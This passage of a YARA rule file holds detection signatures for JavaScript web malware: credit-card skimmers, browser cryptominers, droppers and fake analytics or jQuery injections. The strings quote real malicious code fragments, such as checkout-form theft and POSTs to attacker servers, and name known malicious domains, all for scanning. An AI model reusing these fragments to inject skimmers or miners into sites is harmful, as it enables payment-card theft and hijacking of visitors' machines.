rule js_malware_cc_stealer_023 : malware
{
    strings:
        $trigger = "x.length;var o=[];for(var s=0;s<l;s++){o[s]=x.charAt(s)};for(var s=0;s<l;s++){var"
    condition:
        $trigger and PR00675
}

rule js_malware_cc_stealer_024 : malware
{
    strings:
        $trigger = "XzAgICAgICAgICAgICAgICAgPSB7fQ0KXzAudiAgI"
    condition:
        $trigger and PR00632
}

rule js_malware_cc_stealer_025 : malware
{
    strings:
        $trigger = "aWYgKCF3aW5kb3cuUlIpIFJSID0gT2JqZWN0LmNyZ"
    condition:
        $trigger and PR00632
}

private rule PR00676 : trigger
{
    strings:
        $ps0 = "String.fromCharCode("
    condition:
        $ps0
}

private rule PR00677 : trigger
{
    strings:
        $ps0 = "parseInt(c/a)))+((c=c%a)"
    condition:
        $ps0
}

rule js_malware_cc_stealer_026 : malware
{
    strings:
        $trigger = "|x7A|bom|if|x42|"
    condition:
        $trigger and PR00676 and PR00677 and PR00604
}

private rule PR00678 : trigger
{
    strings:
        $ps0 = "\\x77\\x73\\x73\\x3A\\x2F\\x2F"
    condition:
        $ps0
}

rule js_malware_cc_stealer_029 : malware
{
    strings:
        $trigger = "document[_0x"
    condition:
        $trigger and PR00678
}

rule js_malware_cc_stealer_030 : malware
{
    strings:
        $trigger = "shopify-cart.com"
    condition:
        $trigger and PR00050
}

private rule PR00679 : trigger
{
    strings:
        $ps0 = "c(_scriptCallback))();"
    condition:
        $ps0
}

private rule PR00680 : trigger
{
    strings:
        $ps0 = "split(\".\")[1]"
    condition:
        $ps0
}

rule js_malware_cc_stealer_031 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00679 and PR00680
}

// MANUAL FIX NECESSARY
private rule PR00681 : trigger
{
    strings:
        $ps0 = "+=String.fromCharCode(((parseInt("
    condition:
        $ps0
}

rule js_malware_cc_stealer_033 : malware
{
    strings:
        $trigger = "=[];for(var"
        $js_malware_cc_stealer_033_r0 = /parseInt\([\w]+\[[\d]+\],[\s]*[\d]+\);[\s]*var[\s]*[\w]+[\s]*=[\s]*\[\];/
    condition:
        $trigger and PR00681 and $js_malware_cc_stealer_033_r0
}

// MANUAL FIX NECESSARY
rule js_malware_cc_stealer_033_02 : malware
{
    strings:
        $trigger = "=[];for(var"
        $js_malware_cc_stealer_033_02_r0 = /var [\w]+[\s]*=[\s]*.\\"[\w]{1000,}.\";/
    condition:
        $trigger and PR00681 and $js_malware_cc_stealer_033_02_r0
}

private rule PR00682 : trigger
{
    strings:
        $ps0 = "parseInt(c.charAt("
    condition:
        $ps0
}

rule js_malware_cc_stealer_034 : malware
{
    strings:
        $trigger = "d2NfcGF5bWVudF9tZXRob2Q"
    condition:
        $trigger and PR00423 and PR00682
}

private rule PR00683 : trigger
{
    strings:
        $ps0 = "+= window.atob(\"Q1ZWIDog\") + stripe_token_params.cvc + \"\\n\";"
    condition:
        $ps0
}

rule js_malware_cc_stealer_035 : malware
{
    strings:
        $trigger = "url: window.atob(\"aHR"
    condition:
        $trigger and PR00683 and PR00507
}

rule js_malware_cc_stealer_036 : malware
{
    strings:
        $trigger = "var|x43|x25|x2C|document"
    condition:
        $trigger and PR00676 and PR00677 and PR00604
}

private rule PR00684 : trigger
{
    strings:
        $ps0 = "= window[\"JSON\"][\"parse\"](window[\"atob\"]("
    condition:
        $ps0
}

private rule PR00685 : trigger
{
    strings:
        $ps0 = "(window[\"JSON\"][\"stringify\"]("
    condition:
        $ps0
}

private rule PR00686 : trigger
{
    strings:
        $ps0 = "[\"Domain\"] = location[\"hostname\"];"
    condition:
        $ps0
}

rule js_malware_cc_stealer_037 : malware
{
    strings:
        $trigger = "document"
    condition:
        $trigger and PR00684 and PR00685 and PR00686
}

private rule PR00687 : trigger
{
    strings:
        $ps0 = "var sttae = false;"
    condition:
        $ps0
}

rule js_malware_cc_stealer_037_02 : malware
{
    strings:
        $trigger = "document"
    condition:
        $trigger and PR00687 and PR00684 and PR00685 and PR00686
}

private rule PR00688 : trigger
{
    strings:
        $ps0 = "(encodeURIComponent"
    condition:
        $ps0
}

private rule PR00689 : trigger
{
    strings:
        $ps0 = "-parseInt(_"
    condition:
        $ps0
}

private rule PR00690 : trigger
{
    strings:
        $ps0 = "new XMLHttpRequest();_0x"
    condition:
        $ps0
}

private rule PR00691 : trigger
{
    strings:
        $ps0 = "cardnumb"
    condition:
        $ps0
}

rule js_malware_cc_stealer_038 : malware
{
    strings:
        $trigger = "document[_0x"
    condition:
        $trigger and PR00688 and PR00689 and PR00690 and PR00691
}

rule js_malware_cc_stealer_039 : malware
{
    strings:
        $trigger = "[this['name']],''))return _0x"
    condition:
        $trigger and PR00641 and PR00669
}

private rule PR00692 : trigger
{
    strings:
        $ps0 = "atob("
    condition:
        $ps0
}

private rule PR00693 : trigger
{
    strings:
        $ps0 = "](encodeURIComponent,location["
    condition:
        $ps0
}

private rule PR00694 : trigger
{
    strings:
        $ps0 = ")]();}:function(){};return"
    condition:
        $ps0
}

rule js_malware_cc_stealer_040 : malware
{
    strings:
        $trigger = ";for(var"
    condition:
        $trigger and PR00692 and PR00323 and PR00693 and PR00694
}

private rule PR00695 : trigger
{
    strings:
        $ps0 = "continue;}break;}}});}),_0x"
    condition:
        $ps0
}

rule js_malware_cc_stealer_041 : malware
{
    strings:
        $trigger = ";for(var"
    condition:
        $trigger and PR00695 and PR00493 and PR00323
}

private rule PR00696 : trigger
{
    strings:
        $ps0 = "var _url="
    condition:
        $ps0
}

private rule PR00697 : trigger
{
    strings:
        $ps0 = "/'+_"
    condition:
        $ps0
}

rule js_malware_cc_stealer_042 : malware
{
    strings:
        $trigger = "getScript("
    condition:
        $trigger and PR00696 and PR00697
}

private rule PR00698 : trigger
{
    strings:
        $ps0 = "function(){});"
    condition:
        $ps0
}

rule js_malware_cc_stealer_042_02 : malware
{
    strings:
        $trigger = "getScript("
    condition:
        $trigger and PR00698 and PR00697
}

private rule PR00699 : trigger
{
    strings:
        $ps0 = "btoa(document.querySelector(\"form.checkout.woocommerce-checkout\").serialize())).then(function"
    condition:
        $ps0
}

private rule PR00700 : trigger
{
    strings:
        $ps0 = "jQuery(document).on(\"click\", \"#place_order\", function() {"
    condition:
        $ps0
}

rule js_malware_cc_stealer_043 : malware
{
    strings:
        $trigger = "makeRequest(\"POST\", \"http"
    condition:
        $trigger and PR00699 and PR00700
}

rule js_malware_cc_stealer_044 : malware
{
    strings:
        $trigger = "'noVMd','POST','prototype',"
    condition:
        $trigger and PR00676 and PR00677 and PR00604
}

private rule PR00701 : trigger
{
    strings:
        $ps0 = "stri"
    condition:
        $ps0
}

private rule PR00702 : trigger
{
    strings:
        $ps0 = "atob(_0x"
    condition:
        $ps0
}

rule js_malware_cc_stealer_045 : malware
{
    strings:
        $trigger = "','1|4|2|5|0|','"
    condition:
        $trigger and PR00701 and PR00702
}

private rule PR00703 : trigger
{
    strings:
        $ps0 = "|cc_owner|cc_number|"
    condition:
        $ps0
}

private rule PR00704 : trigger
{
    strings:
        $ps0 = "|Presta_Shop|"
    condition:
        $ps0
}

rule js_malware_cc_stealer_046 : malware
{
    strings:
        $trigger = "parseInt(c/a)))+((c=c%a)"
    condition:
        $trigger and PR00604 and PR00703 and PR00676 and PR00704
}

rule js_malware_createElement_001 : malware
{
    strings:
        $trigger = "[\"\\x73\\x63\\x72\\x69\\x70\\x74\",\"\\x63\\x72\\x65\\x61\\x74\\x65\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\",\"\\x73\\x72\\x63\",\"\\x68\\x74\\x74\\x70"
    condition:
        $trigger and PR00641 and PR00669
}

private rule PR00705 : trigger
{
    strings:
        $ps0 = "100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 34, 115, 99, 114, 105, 112, 116, 34, 41, 59"
    condition:
        $ps0
}

rule js_malware_createElement_002 : malware
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR00029 and PR00705
}

private rule PR00706 : trigger
{
    strings:
        $ps0 = "118, 97, 114, 32, 122, 32, 61') !== false) {"
    condition:
        $ps0
}

private rule PR00707 : trigger
{
    strings:
        $ps0 = "str_replace(\"<head>\", \"<head>\""
    condition:
        $ps0
}

rule js_malware_createElement_002_02 : malware
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR00706 and PR00029 and PR00707
}

private rule PR00708 : trigger
{
    strings:
        $ps0 = "if(!loadStats){function loadStats(){var"
    condition:
        $ps0
}

rule js_malware_createElement_004 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00708
}

rule js_malware_createElement_005 : malware
{
    strings:
        $trigger = "var download_file = \"chrome.exe\""
    condition:
        $trigger and PR00564 and PR00573
}

private rule PR00709 : trigger
{
    strings:
        $ps0 = "document.body||document.documentElement"
    condition:
        $ps0
}

private rule PR00710 : trigger
{
    strings:
        $ps0 = "setAttribute("
    condition:
        $ps0
}

rule js_malware_createElement_007 : malware
{
    strings:
        $trigger = ");})(document.createElement("
    condition:
        $trigger and PR00709 and PR00050 and PR00710 and PR00322
}

rule js_malware_createElement_008 : malware
{
    strings:
        $trigger = "49,49,53,44,49,49,54,44,49,49,49,44,49,49,52,44,49,48,49,44,49,49,52,44,49,48,53,44,49,48,51,44,49,48,52,44,49,49,54,44,49,48,48,44,49,48,49,44,49,49,53,44,49,48,53,44,57,57,44,49,48,53,44,49,49,49,44,49,49,48,44,52,54,44,57,57,44,49,49,49,44,49,48,57"
    condition:
        $trigger and PR00676
}

rule js_malware_createElement_008_02 : malware
{
    strings:
        $trigger = "46,97,112,112,101,110,100,65,102,116,101,114,40,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,83,116,114,105,110,103,46"
    condition:
        $trigger and PR00676
}

rule js_malware_cryptominer_001 : malware
{
    strings:
        $trigger = "miner.start("
    condition:
        $trigger and PR00641
}

rule js_malware_cryptominer_001_04 : malware
{
    strings:
        $trigger = "%6d%69%6e%65%72%2e%73%74%61%72%74%28"
    condition:
        $trigger and PR00231
}

rule js_malware_cryptominer_002 : malware
{
    strings:
        $trigger = "\\x73\\x70\\x6C\\x61\\x73\\x68\\x5F\\x69"
    condition:
        $trigger and PR00647
}

rule js_malware_cryptominer_002_02 : malware
{
    strings:
        $trigger = "x63\\\\x6F\\\\x69\\\\x6E\\\\x68\\\\x69\\\\x76\\\\x65"
    condition:
        $trigger and PR00029
}

private rule PR00711 : trigger
{
    strings:
        $ps0 = "|appendChild"
    condition:
        $ps0
}

private rule PR00712 : trigger
{
    strings:
        $ps0 = "NPRak9QU4lFBSneFt"
    condition:
        $ps0
}

rule js_malware_cryptominer_003 : malware
{
    strings:
        $trigger = "|onload"
    condition:
        $trigger and PR00604 and PR00711 and PR00712 and PR00677
}

rule js_malware_cryptominer_004 : malware
{
    strings:
        $trigger = "$(document).ready(function() {$.getScript(atob(\"aHR0cH"
    condition:
        $trigger
}

private rule PR00713 : trigger
{
    strings:
        $ps0 = "\\x3C\\x73\\x63\\x72\\x69\\x70\\x74\\x3E\\x76\\x61\\x72\\x20\\x6D\\x69\\x6E\\x65\\x72\\x20\\x3D\\x20\\x6E\\x65\\x77\\x20"
    condition:
        $ps0
}

rule js_malware_cryptominer_005 : malware
{
    strings:
        $trigger = "]);document[_"
    condition:
        $trigger and PR00713
}

private rule PR00714 : trigger
{
    strings:
        $ps0 = "|js|document|_0xf"
    condition:
        $ps0
}

rule js_malware_cryptominer_006 : malware
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR00714
}

private rule PR00715 : trigger
{
    strings:
        $ps0 = "dogeminers.com"
    condition:
        $ps0
}

rule js_malware_cryptominer_007 : malware
{
    strings:
        $trigger = "<ifram"
    condition:
        $trigger and PR00577 and PR00715 and PR00578
}

rule js_malware_cryptominer_008 : malware
{
    strings:
        $trigger = "%2F%2F%63%6F%69%6E%68%69%7"
    condition:
        $trigger and PR00050
}

rule js_malware_cryptominer_009 : malware
{
    strings:
        $trigger = "coinpot.co/mine"
    condition:
        $trigger and PR00577 and PR00261
}

rule js_malware_cryptominer_010 : malware
{
    strings:
        $trigger = "\\x7C\\x63\\x6F\\x69\\x6E\\x68\\x69\\x76\\x65\\x7C"
    condition:
        $trigger and PR00641 and PR00669
}

private rule PR00716 : trigger
{
    strings:
        $ps0 = "(window.location.hostname);t(\"https://coinhive.com"
    condition:
        $ps0
}

rule js_malware_cryptominer_011 : malware
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00716
}

rule js_malware_cryptominer_012 : malware
{
    strings:
        $trigger = "new deepMiner."
    condition:
        $trigger and PR00641
}

rule js_malware_cryptominer_013 : malware
{
    strings:
        $trigger = "HDCTApGn0!$e%8)4}w{d7a17\\\\\\\\\\\\\\\\7d17\\\\\\\\\\\\\\\\)q $D|GnPP\" +"
    condition:
        $trigger and PR00029
}

rule js_malware_cryptominer_014 : malware
{
    strings:
        $trigger = "\"\\x68\\x74\\x74\\x70\\x73\\x3A\\x2F\\x2F\\x77\\x65\\x62\\x2E\\x73\\x74\\x61\\x74\\x69\\x2E\\x62\\x69\\x64"
    condition:
        $trigger
}

rule js_malware_cryptominer_015 : malware
{
    strings:
        $trigger = "lib/minero-hidden.min.js"
    condition:
        $trigger and PR00050
}

// MANUAL FIX NECESSARY
rule js_malware_cryptominer_016 : malware
{
    strings:
        $trigger = "/g,\"\\\\\")}eval("
        $js_malware_cryptominer_016_r0 = /\]\.replace\(.[\x01\x02\x03\x04].g,...\)\.replace\(.[\x02\x03\x01\x04].g,\"..\"\)\}eval\(/
    condition:
        $trigger and $js_malware_cryptominer_016_r0
}

private rule PR00717 : trigger
{
    strings:
        $ps0 = "+$3.0$+"
    condition:
        $ps0
}

rule js_malware_cryptominer_017 : malware
{
    strings:
        $trigger = "1$1+\\\\\\\\\\\\"
    condition:
        $trigger and PR00717 and PR00604
}

rule js_malware_cryptominer_018 : malware
{
    strings:
        $trigger = "var server=\"wss://webminerpool.com"
    condition:
        $trigger and PR00675
}

rule js_malware_cryptominer_019 : malware
{
    strings:
        $trigger = "63%6e%68%76%2e%63%6f"
    condition:
        $trigger and PR00231
}

private rule PR00718 : trigger
{
    strings:
        $ps0 = "\"\\x77\\x73\\x73\\x3A\\x2F\\x2F\\x6D\\x75\\x6E\\x65\\x72\\x6F\\x2E\\x6D\\x65\\x3A\\x38\\x38\\x39\\x32\""
    condition:
        $ps0
}

rule js_malware_cryptominer_020 : malware
{
    strings:
        $trigger = "var _0x"
    condition:
        $trigger and PR00718 and PR00641
}

private rule PR00719 : trigger
{
    strings:
        $ps0 = "\\x7"
    condition:
        $ps0
}

rule js_malware_cryptominer_021 : malware
{
    strings:
        $trigger = "[\"\\x69\\x64\"]='\\x6d\\x5f\\x67\\x5f\\x61'"
    condition:
        $trigger and PR00719
}

rule js_malware_cryptominer_022 : malware
{
    strings:
        $trigger = "src = 'https://xs"
    condition:
        $trigger and PR00323
}

private rule PR00720 : trigger
{
    strings:
        $ps0 = "<script type=\"text/javascript\">"
    condition:
        $ps0
}

private rule PR00721 : trigger
{
    strings:
        $ps0 = "tAedoCrahc.x(edoCrahCmorf"
    condition:
        $ps0
}

rule js_malware_cryptominer_023 : malware
{
    strings:
        $trigger = "while(x=eval(x));"
    condition:
        $trigger and PR00720 and PR00721
}

rule js_malware_cryptominer_024 : malware
{
    strings:
        $trigger = "jsecoin.com"
    condition:
        $trigger and PR00050 and PR00323
}

private rule PR00722 : trigger
{
    strings:
        $ps0 = "//xmr.omine.org"
    condition:
        $ps0
}

rule js_malware_cryptominer_025 : malware
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00050 and PR00722
}

private rule PR00723 : trigger
{
    strings:
        $ps0 = "new Client.Anonymous("
    condition:
        $ps0
}

rule js_malware_cryptominer_026 : malware
{
    strings:
        $trigger = "hrottle:"
    condition:
        $trigger and PR00050 and PR00723
}

rule js_malware_cryptominer_027 : malware
{
    strings:
        $trigger = "<script src=\"https://coinhive.com/lib/miner"
    condition:
        $trigger
}

private rule PR00724 : trigger
{
    strings:
        $ps0 = "iner=new CRLT.Anonymous("
    condition:
        $ps0
}

private rule PR00725 : trigger
{
    strings:
        $ps0 = "String"
    condition:
        $ps0
}

rule js_malware_cryptominer_028 : malware
{
    strings:
        $trigger = "var _0xe6af=['min','postMessage','CRLT"
    condition:
        $trigger and PR00724 and PR00725
}

rule js_malware_cryptominer_029 : malware
{
    strings:
        $trigger = "server=\"ws://#\";startMining(\"#\","
    condition:
        $trigger and PR00676
}

private rule PR00726 : trigger
{
    strings:
        $ps0 = "./cipher-core':0x3,'./core':0x4,'./enc-base64"
    condition:
        $ps0
}

private rule PR00727 : trigger
{
    strings:
        $ps0 = "decrypt"
    condition:
        $ps0
}

rule js_malware_cryptominer_030 : malware
{
    strings:
        $trigger = "_doCryptBlock':function(_0"
    condition:
        $trigger and PR00726 and PR00727
}

// MANUAL FIX NECESSARY
private rule PR00728 : trigger
{
    strings:
        $ps0 = ".charCodeAt("
    condition:
        $ps0
}

rule js_malware_cryptominer_031 : malware
{
    strings:
        $trigger = "String.fromCharCode"
        $js_malware_cryptominer_031_r0 = /!';[\s]*\}[\s]*else[\s]*\{[\s]*[\w]+[\s]*\+=[\s]*String\.fromCharCode[\s]*\([\s]*[\w]\.charCodeAt[\s]*\([^\}]+[\s\}]+document\.write\(/
    condition:
        $trigger and PR00728 and PR00224 and $js_malware_cryptominer_031_r0
}

// MANUAL FIX NECESSARY
rule js_malware_cryptominer_032 : malware
{
    strings:
        $trigger = "String.fromCharCode("
        $js_malware_cryptominer_032_r0 = /var[\s]*[\w]+[\s]*=[\s]*['\"][^;]{1000,}['\"];[\s]*function [\w]\([\w]\)[\s]*\{var [\w][\s]*=[\s]*..;[^\{]+\{[\s]*[\w][\s]*\+=[\s]*String\.fromCharCode[^\}]+\}[\s]*return[^\}]+\}[^;]+;[\s]*eval\(.\);?/
    condition:
        $trigger and $js_malware_cryptominer_032_r0
}

private rule PR00729 : trigger
{
    strings:
        $ps0 = "trustiseverything.de"
    condition:
        $ps0
}

rule js_malware_cryptominer_033 : malware
{
    strings:
        $trigger = "script src"
    condition:
        $trigger and PR00050 and PR00729
}

private rule PR00730 : trigger
{
    strings:
        $ps0 = "setItem('f', 'auto.config({ login: \""
    condition:
        $ps0
}

rule js_malware_cryptominer_034 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00730
}

private rule PR00731 : trigger
{
    strings:
        $ps0 = "innerHTML = localStorage.getItem('"
    condition:
        $ps0
}

rule js_malware_cryptominer_034_02 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00731 and PR00730
}

private rule PR00732 : trigger
{
    strings:
        $ps0 = "md5("
    condition:
        $ps0
}

private rule PR00733 : trigger
{
    strings:
        $ps0 = "var linkDesktop"
    condition:
        $ps0
}

private rule PR00734 : trigger
{
    strings:
        $ps0 = "var oneTimeShow"
    condition:
        $ps0
}

rule js_malware_downloader_001 : malware
{
    strings:
        $trigger = "var linkMobile"
    condition:
        $trigger and PR00732 and PR00733 and PR00734
}

private rule PR00735 : trigger
{
    strings:
        $ps0 = "return WSH.CreateObject("
    condition:
        $ps0
}

rule js_malware_dropper_001 : malware
{
    strings:
        $trigger = "noSign.O[0].text = obaAdedapo[0][0].replace(noSign.I, \"A\");"
    condition:
        $trigger and PR00735 and PR00725
}

private rule PR00736 : trigger
{
    strings:
        $ps0 = "\"]].join(\\\"\\\");\"));"
    condition:
        $ps0
}

rule js_malware_eval_hex_001 : malware
{
    strings:
        $trigger = "\\x65\\x76\\x61\\x6c"
    condition:
        $trigger and PR00736 and PR00029
}

private rule PR00737 : trigger
{
    strings:
        $ps0 = ");eval(eval("
    condition:
        $ps0
}

rule js_malware_eval_hex_002 : malware
{
    strings:
        $trigger = "*/;(function(){var"
    condition:
        $trigger and PR00737
}

rule js_malware_eval_hex_003 : malware
{
    strings:
        $trigger = "(function(){var "
    condition:
        $trigger and PR00737
}

rule js_malware_eval_hex_003_001 : malware
{
    strings:
        $trigger = "if($feature == \"widgets\")"
    condition:
        $trigger and PR00737
}

private rule PR00738 : trigger
{
    strings:
        $ps0 = "=window;\"));/*"
    condition:
        $ps0
}

rule js_malware_eval_hex_004 : malware
{
    strings:
        $trigger = "\\x7"
    condition:
        $trigger and PR00738
}

private rule PR00739 : trigger
{
    strings:
        $ps0 = "-google.info/"
    condition:
        $ps0
}

rule js_malware_fakedomain_001 : malware
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00739
}

private rule PR00740 : trigger
{
    strings:
        $ps0 = ".js\")"
    condition:
        $ps0
}

rule js_malware_fake_jquery_001 : malware
{
    strings:
        $trigger = "require(\"./js/jquery-"
    condition:
        $trigger and PR00740
}

private rule PR00741 : trigger
{
    strings:
        $ps0 = "\\x71\\x75\\x65\\x72\\x79\\x2E\\x63\\x6F\\x6D\\x2F\\x63\\x6F\\x6D\\x70\\x61\\x62\\x69\\x6C\\x69\\x74\\x79\\x2E\\x70\\x68\\x70\\x3F"
    condition:
        $ps0
}

rule js_malware_fake_jquery_002 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00741
}

private rule PR00742 : trigger
{
    strings:
        $ps0 = "encodeURI(navigator.userAgent)"
    condition:
        $ps0
}

private rule PR00743 : trigger
{
    strings:
        $ps0 = "encodeURI(document.referrer)"
    condition:
        $ps0
}

rule js_malware_fake_jquery_003 : malware
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00050 and PR00742 and PR00743
}

private rule PR00744 : trigger
{
    strings:
        $ps0 = "qa('create',"
    condition:
        $ps0
}

rule js_malware_fakeanalytics_001 : malware
{
    strings:
        $trigger = "<script>"
    condition:
        $trigger and PR00744
}

rule js_malware_fakeanalytics_002 : malware
{
    strings:
        $trigger = "sanidtarysdpasljoldw"
    condition:
        $trigger and PR00323
}

private rule PR00745 : trigger
{
    strings:
        $ps0 = "main1.js"
    condition:
        $ps0
}

private rule PR00746 : trigger
{
    strings:
        $ps0 = "gcse.type"
    condition:
        $ps0
}

rule js_malware_fakegcse_001 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00745 and PR00746
}

private rule PR00747 : trigger
{
    strings:
        $ps0 = "gcse.src = (document.location.protocol"
    condition:
        $ps0
}

private rule PR00748 : trigger
{
    strings:
        $ps0 = "X.open(\"POST\", 'http://' + SERVER_IP + ':' + SERVER_PORT +"
    condition:
        $ps0
}

rule js_malware_fakegcse_002 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00747 and PR00748
}

private rule PR00749 : trigger
{
    strings:
        $ps0 = "navigator.userAgent.toLowerCase();function"
    condition:
        $ps0
}

rule js_malware_fbfakevideo_001 : malware
{
    strings:
        $trigger = "script>l1l="
    condition:
        $trigger and PR00749 and PR00050 and PR00323
}

rule js_malware_freetools_info_001 : malware
{
    strings:
        $trigger = "\\x2E\\x69\\x6E\\x66\\x6F\\x2F\",\""
    condition:
        $trigger and PR00332 and PR00719
}

rule js_malware_gads_001 : malware
{
    strings:
        $trigger = "gads.src = '\\x68\\x74\\x74\\x70"
    condition:
        $trigger
}

rule js_malware_generic_001 : malware
{
    strings:
        $trigger = "<script>d=Date;d=new d"
    condition:
        $trigger
}

private rule PR00750 : trigger
{
    strings:
        $ps0 = "s+=ar.substr(pos,1);}e(s);"
    condition:
        $ps0
}

rule js_malware_generic_001_02 : malware
{
    strings:
        $trigger = "date=new Date()"
    condition:
        $trigger and PR00750
}

rule js_malware_generic_002 : malware
{
    strings:
        $trigger = "<script>i=0;if(window"
    condition:
        $trigger
}

rule js_malware_generic_003 : malware
{
    strings:
        $trigger = "<script>try{q.appendChild"
    condition:
        $trigger
}

private rule PR00751 : trigger
{
    strings:
        $ps0 = "if|parseInt|detectIE|iframe|"
    condition:
        $ps0
}

rule js_malware_generic_007 : malware
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR00751
}

private rule PR00752 : trigger
{
    strings:
        $ps0 = "<tag"
    condition:
        $ps0
}

rule js_malware_generic_008 : malware
{
    strings:
        $trigger = "return c.toString("
    condition:
        $trigger and PR00752 and PR00604
}

rule js_malware_generic_022 : malware
{
    strings:
        $trigger = ".split('*');for(var"
    condition:
        $trigger and PR00050
}

private rule PR00753 : trigger
{
    strings:
        $ps0 = "Python|cache|inurl|45|31|30|while"
    condition:
        $ps0
}

rule js_malware_generic_023 : malware
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR00753
}

private rule PR00754 : trigger
{
    strings:
        $ps0 = "_gfsf_uu_getbyte|cookie|indexOf|push"
    condition:
        $ps0
}

rule js_malware_generic_025 : malware
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR00754
}

rule js_malware_generic_025_02 : malware
{
    strings:
        $trigger = "|ame|write|document|s|rc"
    condition:
        $trigger and PR00604
}

private rule PR00755 : trigger
{
    strings:
        $ps0 = "|gd|"
    condition:
        $ps0
}

private rule PR00756 : trigger
{
    strings:
        $ps0 = "|write|document|"
    condition:
        $ps0
}

rule js_malware_generic_027 : malware
{
    strings:
        $trigger = "|is|"
    condition:
        $trigger and PR00604 and PR00755 and PR00756
}

private rule PR00757 : trigger
{
    strings:
        $ps0 = "\\x73\\x74\\x79\\x6c\\x65\\x2e\\x64\\x69\\x73\\x70\\x6c\\x61\\x79\\x3d\\x27\\x6e\\x6f\\x27\\x20\\x2b\\x20\\x27\\x6e\\x65\\x27"
    condition:
        $ps0
}

rule js_malware_generic_030 : malware
{
    strings:
        $trigger = "document.writeln"
    condition:
        $trigger and PR00757
}

private rule PR00758 : trigger
{
    strings:
        $ps0 = "\\/\\/url.ie\\/"
    condition:
        $ps0
}

rule js_malware_generic_031 : malware
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00758 and PR00050
}

private rule PR00759 : trigger
{
    strings:
        $ps0 = "consent script</a></noscript>"
    condition:
        $ps0
}

rule js_malware_generic_032 : malware
{
    strings:
        $trigger = "<a href=\"http"
    condition:
        $trigger and PR00759 and PR00050
}

private rule PR00760 : trigger
{
    strings:
        $ps0 = "{  return (eval('pars'+'eInt')("
    condition:
        $ps0
}

rule js_malware_generic_033 : malware
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00760
}

private rule PR00761 : trigger
{
    strings:
        $ps0 = "ult-blk-cbl."
    condition:
        $ps0
}

rule js_malware_generic_035 : malware
{
    strings:
        $trigger = "styl"
    condition:
        $trigger and PR00564 and PR00761
}

rule js_malware_generic_037 : malware
{
    strings:
        $trigger = "src=\"https://www.onlineclouds.info/v1/api/helper.js"
    condition:
        $trigger and PR00050
}

rule js_malware_generic_038 : malware
{
    strings:
        $trigger = "src=\"https://braincdn.org/"
    condition:
        $trigger and PR00050
}

rule js_malware_generic_039 : malware
{
    strings:
        $trigger = "\\x2F\\x61\\x70\\x70\\x2E\\x6A\\x73\\x22\\x3E\\x3C\\x2F\\x73\\x63"
    condition:
        $trigger and PR00641 and PR00669
}

private rule PR00762 : trigger
{
    strings:
        $ps0 = "var popunder = {expire"
    condition:
        $ps0
}

rule js_malware_generic_041 : malware
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00762
}

private rule PR00763 : trigger
{
    strings:
        $ps0 = "new window[\"\\x52\\x65\\x67\\x45\\x78\\x70\"]"
    condition:
        $ps0
}

rule js_malware_generic_042 : malware
{
    strings:
        $trigger = "navigator[\"\\x75\\x73\\x65\\x72\\x41\\x67\\x65\\x6e\\x74\"];"
    condition:
        $trigger and PR00641 and PR00763
}

private rule PR00764 : trigger
{
    strings:
        $ps0 = "throw'\\x45\\x72'+'\\x72\\x6f'+'\\x72\\x20'+'\\x69\\x6e'+'\\x20\\x70"
    condition:
        $ps0
}

rule js_malware_generic_043 : malware
{
    strings:
        $trigger = "document["
    condition:
        $trigger and PR00764
}

private rule PR00765 : trigger
{
    strings:
        $ps0 = "b0RErwToL3roDsxnRapojCyFBs2Ed"
    condition:
        $ps0
}

rule js_malware_generic_044 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00765
}

private rule PR00766 : trigger
{
    strings:
        $ps0 = ".replace(RegExp("
    condition:
        $ps0
}

private rule PR00767 : trigger
{
    strings:
        $ps0 = "cmd.exe"
    condition:
        $ps0
}

rule js_malware_generic_045 : malware
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR00029 and PR00766 and PR00767
}

rule js_malware_gpl_001 : malware
{
    strings:
        $trigger = "<script>/*LGPL*/ try{ window.onload"
    condition:
        $trigger
}

rule js_malware_gpl_002 : malware
{
    strings:
        $trigger = "<script>/*GNU GPL*/ try{window.onload"
    condition:
        $trigger
}

private rule PR00768 : trigger
{
    strings:
        $ps0 = "hashdate().toString(16) + \".eu/script.html?"
    condition:
        $ps0
}

rule js_malware_hashdate_001 : malware
{
    strings:
        $trigger = "<script>"
    condition:
        $trigger and PR00768
}

rule js_malware_hiddeniframe_001 : malware
{
    strings:
        $trigger = "document}catch(dgsgsdg){zxc"
    condition:
        $trigger
}

rule js_malware_hiddeniframe_002_002 : malware
{
    strings:
        $trigger = "js_kod2.src = 'http://kreotceonite.com/"
    condition:
        $trigger and PR00050 and PR00323
}

rule js_malware_hiddeniframe_002_003 : malware
{
    strings:
        $trigger = "js_kod2.src = 'http://anadoluengellilerkenti.com/img/trans/"
    condition:
        $trigger and PR00050 and PR00323
}

private rule PR00769 : trigger
{
    strings:
        $ps0 = "document.write"
    condition:
